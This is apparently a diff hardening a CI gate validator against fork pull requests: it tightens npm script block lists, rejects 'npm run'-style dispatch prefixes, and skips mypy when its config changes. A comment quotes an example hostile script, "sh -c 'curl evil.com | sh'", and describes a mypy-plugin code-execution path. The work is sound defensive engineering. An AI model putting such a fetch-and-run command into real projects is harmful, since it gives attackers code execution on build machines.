@@ -156,12 +156,6 @@ _RECOGNIZED_NPM_SCRIPTS: Tuple[str, ...] = (
 _FORBIDDEN_SCRIPT_FRAGMENTS: Tuple[str, ...] = (
     "--write",
     "--fix",
-    "install",
-    "publish",
-    "deploy",
-    "start",
-    " build",
-    "build:",
     "git push",
     "rm -",
     "rimraf",
@@ -172,6 +166,26 @@ _FORBIDDEN_SCRIPT_FRAGMENTS: Tuple[str, ...] = (
     # them. Gates must be non-mutating (issue #1092 product
     # requirement).
     "--cache",
+    # ``build:`` (with the colon) is an npm-script-namespace
+    # prefix; bare ``build`` is too common in legitimate filenames
+    # (``src/build_utils.ts``) so it is checked separately with a
+    # word-boundary match below.
+    "build:",
+)
+
+# Iter-31 Finding 3: word-bounded fragments. Bare-substring
+# matching rejects legitimate filenames like ``src/install.ts`` or
+# ``utils/start.ts`` even though the script body itself is safe.
+# These tokens are dangerous only when they appear as standalone
+# command/argv tokens, not when embedded in a path or identifier.
+# Each entry is matched as a whitespace-delimited token (with
+# start-of-string and end-of-string also treated as whitespace).
+_FORBIDDEN_WORD_FRAGMENTS: Tuple[str, ...] = (
+    "install",
+    "publish",
+    "deploy",
+    "start",
+    "build",
 )
 
 
@@ -284,6 +298,15 @@ def _script_is_acceptable(command: str) -> bool:
     for forbidden in _FORBIDDEN_SCRIPT_FRAGMENTS:
         if forbidden in scan_target:
             return False
+    # Iter-31 Finding 3: word-bounded fragments. Match each forbidden
+    # word ONLY when it appears as a standalone token (preceded and
+    # followed by whitespace, start, or end). This stops bare
+    # ``install`` inside a legitimate path like ``src/install.ts``
+    # from falsely rejecting the script.
+    word_tokens = set(scan_target.split())
+    for word in _FORBIDDEN_WORD_FRAGMENTS:
+        if word in word_tokens:
+            return False
     # Case-sensitive shell metachar / substitution / redirection /
     # newline / lead-with-shell-binary tokens. Tokens carrying a space
     # are matched space-padded to avoid clobbering legitimate paths like
@@ -296,20 +319,17 @@ def _script_is_acceptable(command: str) -> bool:
         else:
             if token in command or token in lowered:
                 return False
-    # Strip leading package-manager prefix so that
-    # ``npm run format:check`` and ``yarn format:check`` both reduce to
-    # the recognised tool head.
-    #
-    # Iter-22 Finding 2: ``npx`` is special. Unlike the ``run`` /
-    # ``yarn`` / ``pnpm`` / ``bun`` invocations, bare ``npx <tool>``
-    # falls back to a registry download + install + exec when the
-    # tool is not present in the local ``node_modules``. The
-    # tsconfig-based discovery path emits ``npx --no-install`` for
-    # this reason; the npm-run discovery path MUST hold the same
-    # bar. Accept the ``npx`` prefix ONLY when the script body
-    # explicitly contains ``--no-install`` (operators who want the
-    # gate can write ``npx --no-install tsc --noEmit``); reject
-    # bare ``npx`` to keep gates local/deterministic/non-mutating.
+    # Iter-22 Finding 2 + iter-31 Finding 1: ``npx --no-install`` is
+    # the only safe package-manager prefix. ``npm run <X>`` / ``yarn
+    # run <X>`` / ``pnpm run <X>`` / ``bun run <X>`` / bare
+    # ``yarn <X>`` etc. all dispatch to a DIFFERENT named script in
+    # ``package.json`` whose body we never validated — a fork PR can
+    # add ``"prettier": "sh -c 'curl evil.com | sh'"`` and the
+    # accepted ``format:check`` script body of ``yarn run prettier
+    # --check .`` becomes RCE. Reject every "dispatch" prefix
+    # outright; operators who want a gate must invoke the tool
+    # directly (e.g. ``"format:check": "prettier --check ."``) or
+    # via the validated ``npx --no-install`` path.
     stripped = lowered
     if stripped.startswith("npx "):
         if "--no-install" not in stripped:
@@ -320,7 +340,7 @@ def _script_is_acceptable(command: str) -> bool:
         if stripped.startswith("--no-install"):
             stripped = stripped[len("--no-install") :].lstrip()
     else:
-        for prefix in (
+        for forbidden_prefix in (
             "npm run ",
             "yarn run ",
             "pnpm run ",
@@ -329,9 +349,8 @@ def _script_is_acceptable(command: str) -> bool:
             "pnpm ",
             "bun ",
         ):
-            if stripped.startswith(prefix):
-                stripped = stripped[len(prefix) :].lstrip()
-                break
+            if stripped.startswith(forbidden_prefix):
+                return False
     for head in _ACCEPTABLE_SCRIPT_HEADS:
         if stripped.startswith(head):
             # Iter-27 Finding 2: tighten the head match — ``stripped``
@@ -870,7 +889,28 @@ def _discover_python_gates(
                 ),
             )
         )
-    if changed_py and _tool_section_present("mypy") and shutil.which("mypy"):
+    # Iter-31 Finding 2: mypy supports ``plugins = ["evil_plugin.py"]``
+    # under ``[tool.mypy]`` (or in ``mypy.ini`` / ``setup.cfg``).
+    # When the plugin path resolves to a worktree file, mypy
+    # imports and executes it during type-checking — full RCE on a
+    # fork PR that ships both a plugin file and a config update.
+    # ruff is Rust and has no Python-plugin escape hatch; black has
+    # no plugins; only mypy needs this guard. Skip the mypy gate
+    # when the PR modified any of its config surfaces.
+    pr_changed_pyset = {f.lower() for f in changed_files}
+    mypy_config_pr_touched = any(
+        path.endswith("pyproject.toml")
+        or path.endswith("mypy.ini")
+        or path.endswith(".mypy.ini")
+        or path.endswith("setup.cfg")
+        for path in pr_changed_pyset
+    )
+    if (
+        changed_py
+        and _tool_section_present("mypy")
+        and shutil.which("mypy")
+        and not mypy_config_pr_touched
+    ):
         gates.append(
             Gate(
                 name="mypy",
